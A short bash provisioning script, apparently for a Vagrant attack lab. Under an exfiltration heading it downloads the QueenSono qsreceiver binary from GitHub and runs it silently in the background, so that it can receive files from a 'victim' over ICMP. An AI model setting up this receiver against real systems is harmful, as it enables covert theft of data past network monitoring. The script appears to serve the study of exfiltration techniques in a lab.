#!/bin/bash

# General
apt update -y
apt install wget -y

#[EXFILTRATION]

#Setup qsreceiver to receive files from victim via ICMP
wget https://github.com/ariary/QueenSono/releases/latest/download/qsreceiver -O /tmp/qsreceiver
chmod +x /tmp/qsreceiver
cp /vagrant/attack/exfiltration/run_qsreceiver.sh /tmp/run_qsreceiver.sh;
chmod +x /tmp/run_qsreceiver.sh
nohup bash /tmp/run_qsreceiver.sh &>/dev/null &


